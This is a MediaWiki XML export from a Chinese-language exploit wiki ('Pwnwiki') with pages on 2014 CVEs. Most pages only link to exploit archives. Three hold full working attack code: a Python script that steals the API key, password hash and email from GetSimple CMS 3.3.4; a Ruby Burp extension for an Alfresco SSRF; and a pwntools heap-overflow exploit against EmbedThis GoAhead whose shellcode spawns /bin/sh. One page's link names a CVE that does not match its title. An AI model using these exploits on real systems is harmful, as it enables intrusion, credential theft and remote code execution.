    <title>CVE-2014-7920 Android 2.2 through 5.x before 5.1 特權提升漏洞</title>
    <ns>0</ns>
    <id>889</id>
    <revision>
      <id>1156</id>
      <timestamp>2021-04-08T01:35:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-7920.zip"</comment>
      <origin>1156</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="cpxnrvprngm1l9lhd6tww3ta4kqrbur" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-7920.zip</text>
      <sha1>cpxnrvprngm1l9lhd6tww3ta4kqrbur</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-8069 YOOtheme Pagekit CMS 0.8.7 XSS漏洞</title>
    <ns>0</ns>
    <id>891</id>
    <revision>
      <id>1158</id>
      <timestamp>2021-04-08T01:38:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Multiple cross-site scripting (XSS) vulnerabilities in YOOtheme Pagekit CMS 0.8.7 allow remote attackers to inject arbitrary web script or HTML via the (1) HTTP Refer..."</comment>
      <origin>1158</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="310" sha1="4e90r99v067u21z6rm6uswmsir9970x" xml:space="preserve">==INFO==
Multiple cross-site scripting (XSS) vulnerabilities in YOOtheme Pagekit CMS 0.8.7 allow remote attackers to inject arbitrary web script or HTML via the (1) HTTP Referer header to index.php/user or (2) PATH_INFO to index.php.


==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-8609.zip</text>
      <sha1>4e90r99v067u21z6rm6uswmsir9970x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-8110 Apache ActiveMQ 5.x before 5.10.1 XSS漏洞</title>
    <ns>0</ns>
    <id>890</id>
    <revision>
      <id>1157</id>
      <timestamp>2021-04-08T01:37:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-8110.zip"</comment>
      <origin>1157</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="rnddpzyhogh44jd2wm9spb5b8uj95gt" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-8110.zip</text>
      <sha1>rnddpzyhogh44jd2wm9spb5b8uj95gt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-8722 GetSimple CMS 3.3.4 信息泄露漏洞</title>
    <ns>0</ns>
    <id>3334</id>
    <revision>
      <id>3892</id>
      <timestamp>2021-06-03T00:54:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: GetSimple CMS 3.3.4 - Information Disclosure # Date 01.06.2021 # Exploit Author: Ron Jost (Hacker5preme) # Vendor Homepage: http://get-simple.in..."</comment>
      <origin>3892</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2743" sha1="qv08xua446c5k4h25ivyllgu6yuviix" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: GetSimple CMS 3.3.4 - Information Disclosure
# Date 01.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: http://get-simple.info/
# Software Link: https://github.com/GetSimpleCMS/GetSimpleCMS/archive/refs/tags/v3.3.4.zip
# Version: 3.3.4
# CVE: CVE-2014-8722
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2014-8722-Exploit


'''
Description:
GetSimple CMS 3.3.4 allows remote attackers to obtain sensitive information via a direct request to
(1) data/users/&lt;username&gt;.xml,
(2) backups/users/&lt;username&gt;.xml.bak,
(3) data/other/authorization.xml, or
(4) data/other/appid.xml.
'''


'''
Import required modules:
'''
import sys
import requests

'''
User-Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
cmspath = sys.argv[3]
print('')
username = input("Do you know the username? Y/N: ")
if username == 'Y':
    print('')
    username = True
    username_string = input('Please enter the username: ')
else:
    print('')
    username = False
    print('No problem, you will still get the API key')


'''
Get Api-Key:
'''
url = 'http://' + target_ip + ':' + target_port + cmspath + '/data/other/authorization.xml'
header = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
}
x = requests.get(url, headers=header).text
start = x.find('[') + 7
end = x.find(']')
api_key = x[start:end]
print('')
print('Informations:')
print('')
print('[*] API Key: ' + api_key)


if username:
    '''
    Get Email and Passwordhash:
    '''
    url = "http://" + target_ip + ':' + target_port + cmspath + '/data/users/' + username_string + '.xml'
    header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
    }
    x = requests.get(url, headers=header).text
    start =  x[x.find('PWD&gt;'):]
    passwordhash = start[start.find('&gt;') +1 :start.find('&lt;')]
    print('[*] Hashed Password: ' + passwordhash)

    start = x[x.find('EMAIL&gt;'):]
    email = start[start.find('&gt;') + 1 : start.find('&lt;')]
    print('[*] Email: ' + email)
print('')
&lt;/pre&gt;</text>
      <sha1>qv08xua446c5k4h25ivyllgu6yuviix</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-9222 Misfortune Cookie漏洞</title>
    <ns>0</ns>
    <id>892</id>
    <revision>
      <id>1159</id>
      <timestamp>2021-04-08T01:40:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== AllegroSoft RomPager 4.34 and earlier, as used in Huawei Home Gateway products and other vendors and products, allows remote attackers to gain privileges via a crafte..."</comment>
      <origin>1159</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="335" sha1="0k6g2qq86redeiu9i0v9qvx6yx8fhlc" xml:space="preserve">==INFO==
AllegroSoft RomPager 4.34 and earlier, as used in Huawei Home Gateway products and other vendors and products, allows remote attackers to gain privileges via a crafted cookie that triggers memory corruption, aka the "Misfortune Cookie" vulnerability.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-9222.zip</text>
      <sha1>0k6g2qq86redeiu9i0v9qvx6yx8fhlc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-9301 Alfresco Community Edition before 5.0.a 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>848</id>
    <revision>
      <id>1107</id>
      <timestamp>2021-04-07T08:19:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Server-side request forgery (SSRF) vulnerability in the proxy servlet in Alfresco Community Edition before 5.0.a allows remote attackers to trigger outbound requests..."</comment>
      <origin>1107</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3566" sha1="gqhfipqzy3u31qroafdzdmhq6ytr549" xml:space="preserve">==INFO==
Server-side request forgery (SSRF) vulnerability in the proxy servlet in Alfresco Community Edition before 5.0.a allows remote attackers to trigger outbound requests to intranet servers, conduct port scans, and read arbitrary files via a crafted URI in the endpoint parameter.

==POC==
&lt;pre&gt;
require 'java'
java_import 'burp.IBurpExtender'
java_import 'burp.IHttpListener'
java_import 'burp.IMessageEditorController'

class BurpExtender
  include IBurpExtender, IHttpListener, IMessageEditorController

  #
  # implement IBurpExtender
  #
  def	registerExtenderCallbacks(callbacks)
	  #@HOST_FROM = 'host1.example.org'
	  #@HOST_TO = 'host2.example.org'
    # obtain an extension helpers object
    @helpers = callbacks.getHelpers()
    # set our extension name
    callbacks.setExtensionName("Traffic redirector")
    # register ourselves as an HTTP listener
    callbacks.registerHttpListener(self)
  end
  #
  # implement IHttpListener
  #
  def processHttpMessage(toolFlag, messageIsRequest, messageInfo)
    # only process requests
    if (messageIsRequest)

      # get the HTTP service for the request
      httpService = messageInfo.getHttpService()

      request = messageInfo.getRequest()
      @root_path = nil unless request.to_s.lines.first.index('endpoint').nil?

      referer = request.to_s.scan(/Referer: (.*)/)
      referer.flatten!
      referer =referer.first.scan(/(\/alfresco\/.*:\d+\/)(.*)/) rescue []
      root_path = referer.flatten.first
      relative_path = "/#{referer.flatten.last}"
      if @root_path.nil? || @root_path.to_s != root_path
        @root_path =root_path unless root_path.nil?
        @relative_path = relative_path unless root_path.nil?
      end
      puts "INSTANCE_ROOT_PATH: #{@root_path}"
      puts "Instance Relative_PATH: #{@relative_path}"
      puts "ROOT_PATH: #{root_path}"
      puts "Relative_PATH: #{relative_path}"
      puts request.to_s.lines.first
      new_req = request.to_s.sub("/alfresco/","/")
      new_req = request if new_req.nil?
      if new_req.to_s.lines.first.count('/')&lt;3
        print "Single dash "
        puts new_req.to_s.lines.first
        unless root_path == relative_path
          rel = @relative_path.split("/")
          rel[-1] = ""
          new_req = new_req.to_s.sub("/", rel.join('/'))
        end
      end

      new_req = new_req.to_s.sub("/", @root_path)
      print "Final request "
      puts new_req

      messageInfo.setRequest(
        @helpers.stringToBytes(new_req)
      )

      # if the host is HOST_FROM, change it to HOST_TO
      #if (@HOST_FROM == httpService.getHost())
      #    messageInfo.setHttpService(
      #      @helpers.buildHttpService(
      #        @HOST_TO,
      #        httpService.getPort(),
      #        httpService.getProtocol()
      #      )
      #    )
      #end
    end
  ensure
    puts '----------------------'
  end

  #
  # implement IMessageEditorController
  # this allows our request/response viewers to obtain details about the messages being displayed
  #
  def getHttpService()
    return @currentlyDisplayedItem.getHttpService()
  end

  def getRequest()
    return @currentlyDisplayedItem.getRequest()
  end

  def getResponse()
    return @currentlyDisplayedItem.getResponse()
  end

	#
  # getter / setters
 	#

  def callbacks
    @callbacks
  end

  def log
    @log
  end

  def requestViewer
    @requestViewer
  end

  def responseViewer
    @responseViewer
  end

  def currentlyDisplayedItem=(currentlyDisplayedItem)
    @currentlyDisplayedItem = currentlyDisplayedItem
  end
end

&lt;/pre&gt;</text>
      <sha1>gqhfipqzy3u31qroafdzdmhq6ytr549</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-9322 Linux kernel before 3.17.5 特權提升漏洞</title>
    <ns>0</ns>
    <id>893</id>
    <revision>
      <id>1160</id>
      <timestamp>2021-04-08T01:41:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== arch/x86/kernel/entry_64.S in the Linux kernel before 3.17.5 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows loc..."</comment>
      <origin>1160</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="376" sha1="acoveb2wjbk983jts484k71lmrfu3hm" xml:space="preserve">==INFO==
arch/x86/kernel/entry_64.S in the Linux kernel before 3.17.5 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-9322.zip</text>
      <sha1>acoveb2wjbk983jts484k71lmrfu3hm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-9707 EmbedThis GoAhead 3.0.0 through 3.4.1 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>847</id>
    <revision>
      <id>1106</id>
      <timestamp>2021-04-07T08:18:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== EmbedThis GoAhead 3.0.0 through 3.4.1 does not properly handle path segments starting with a . (dot), which allows remote attackers to conduct directory traversal att..."</comment>
      <origin>1106</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1911" sha1="fzhwnzou7q4sl8xryauv3eb2n2aedgd" xml:space="preserve">==INFO==
EmbedThis GoAhead 3.0.0 through 3.4.1 does not properly handle path segments starting with a . (dot), which allows remote attackers to conduct directory traversal attacks, cause a denial of service (heap-based buffer overflow and crash), or possibly execute arbitrary code via a crafted URI.

==EXP==
&lt;pre&gt;
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *


def hex2url(i):
    array = format(i, 'X')
    if len(array) % 2 != 0:
        array = '0' + array
    ret = ''.join('%' + array[i-2:i] for i in xrange(len(array), 0, -2))
    return ret


def make_fake_chunk(chunk_addr):
    chunk = (chunk_addr &amp; ~0xff) + 0x12f
    fd = int(format(chunk, '08X')[:6], 16)
    bk = chunk
    return fd, bk, chunk


pro = remote('localhost', 80)

chunk = 0x8057840

fd, bk, fake_chunk = make_fake_chunk(chunk)
print(hex(fd), hex(bk), hex(fake_chunk))

shellcode = '%eb%16%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90'
shellcode += "%eb%19%5e%31%d2%89%56%07%52%56%89%e1%89%f3%31%c0%b0%0b%cd"
shellcode += "%80%31%db%31%c0%40%cd%80%e8%e2%ff%ff%ff%2f%62%69"
shellcode += "%6e%2f%73%68"


shellcode_addr = fake_chunk + 4 * 4

offset = 0

exp = 'GET /'
exp += hex2url(fd)                 # fd
exp += hex2url(bk)                 # bk
exp += hex2url(0xbffff2ac - 20)    # fd_next, stack
exp += hex2url(shellcode_addr)     # bk_next

pad = fake_chunk - chunk - 16
print('pad:{0}'.format(pad))

# fake chunk
exp += 'A' * (fake_chunk - chunk - 16)
exp += hex2url(0x01020304)   # prev_size
exp += hex2url(0x01020304)   # size
exp += hex2url(chunk - 8)    # fd
exp += hex2url(chunk - 8)    # bk

exp += shellcode

print('--{}'.format(1024 - (fake_chunk - chunk) - 16 - len(shellcode)/3))

exp += '/./'
exp += hex2url(2) * 50
exp += 'A' * (1024 - (fake_chunk - chunk) - 16 - len(shellcode) / 3 - 50)
exp += '/.x'
exp += ' HTTP/1.0\r\n\r\n'

print(len(exp))
print(exp)
pro.send(exp)

&lt;/pre&gt;</text>
      <sha1>fzhwnzou7q4sl8xryauv3eb2n2aedgd</sha1>
    </revision>
  </page>
</mediawiki>
